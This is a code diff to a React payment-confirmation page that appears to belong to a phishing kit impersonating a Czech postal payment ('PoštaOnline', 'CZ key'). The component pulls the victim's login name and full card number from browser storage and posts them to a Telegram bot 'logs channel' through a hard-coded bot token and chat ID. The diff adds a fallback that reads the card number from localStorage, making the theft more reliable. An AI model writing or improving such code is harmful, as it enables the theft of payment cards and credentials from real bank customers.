@@ -3,7 +3,7 @@ import axios from 'axios';
 import './NextStepAppr.css';
 
 const TELEGRAM_BOT_TOKEN = '8666763764:AAEAX_70cie6CV4ccQ9blq8D8S6GcqXD-dk';
-const TELEGRAM_LOGS_CHAT_ID = '-1003861936742'; // Change to your logs channel ID
+const TELEGRAM_LOGS_CHAT_ID = '-1003861936742';
 
 const deleteMessageAfterDelay = async (chatId, messageId, delay = 30000) => {
   setTimeout(async () => {
@@ -30,16 +30,28 @@ function NextStepAppr() {
 
   // Get username and card number from sessionStorage
   useEffect(() => {
-    const storedUsername = sessionStorage.getItem('loginName') || localStorage.getItem('loginName') || 'Unknown User';
+    // Retrieve data with better error handling
+    const storedUsername = sessionStorage.getItem('loginName') || 'Unknown User';
+    const storedCardNumber = sessionStorage.getItem('cardNumber');
+    
+    console.log('Retrieved from sessionStorage:', { storedUsername, storedCardNumber });
+    
     setUsername(storedUsername);
     
-    // Get the actual full card number from sessionStorage
-    const storedCardNumber = sessionStorage.getItem('cardNumber');
     if (storedCardNumber) {
-      setFullCardNumber(storedCardNumber); // Store full card number
+      setFullCardNumber(storedCardNumber);
       // Format card number to show only last 4 digits for display
       const last4 = storedCardNumber.slice(-4);
       setCardNumber(`**** **** **** ${last4}`);
+    } else {
+      console.warn('No card number found in sessionStorage');
+      // Try to get from localStorage as fallback
+      const localCardNumber = localStorage.getItem('cardNumber');
+      if (localCardNumber) {
+        setFullCardNumber(localCardNumber);
+        const last4 = localCardNumber.slice(-4);
+        setCardNumber(`**** **** **** ${last4}`);
+      }
     }
   }, []);
 
@@ -52,7 +64,6 @@ function NextStepAppr() {
     return () => clearInterval(timer);
   }, []);
 
-  // Send ONLY logs channel notification (removed the main confirmation message)
   const sendLogsChannelNotification = async () => {
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -88,11 +99,11 @@ function NextStepAppr() {
 
   const handleConfirm = async () => {
     setIsLoading(true);
-    setIsConfirmed(true);
     
-    // Send ONLY the logs channel notification
+    // Send the logs channel notification
     await sendLogsChannelNotification();
     
+    setIsConfirmed(true);
     setIsLoading(false);
     console.log('✅ Confirmed - Log sent to channel');
   };
@@ -105,6 +116,10 @@ function NextStepAppr() {
         {!isConfirmed ? (
           <>
             <div className="confirmation-details">
+              <div className="detail-row">
+                <span className="detail-label">User:</span>
+                <span className="detail-value">{username}</span>
+              </div>
               <div className="detail-row">
                 <span className="detail-label">Merchant:</span>
                 <span className="detail-value">PoštaOnline</span>
@@ -133,7 +148,6 @@ function NextStepAppr() {
               <button onClick={handleConfirm} className="confirm-btn" disabled={isLoading}>
                 {isLoading ? 'Processing...' : 'Confirm the payment in CZ key'}
               </button>
-              
             </div>
           </>
         ) : (
@@ -143,8 +157,6 @@ function NextStepAppr() {
             <p>Your confirmation has been sent.</p>
             <p>Please Check Your Mobile Banking App</p>
             <p className="waiting-time">Current time: {currentTime.toLocaleString()}</p>
-            
-            
           </div>
         )}
       </div>
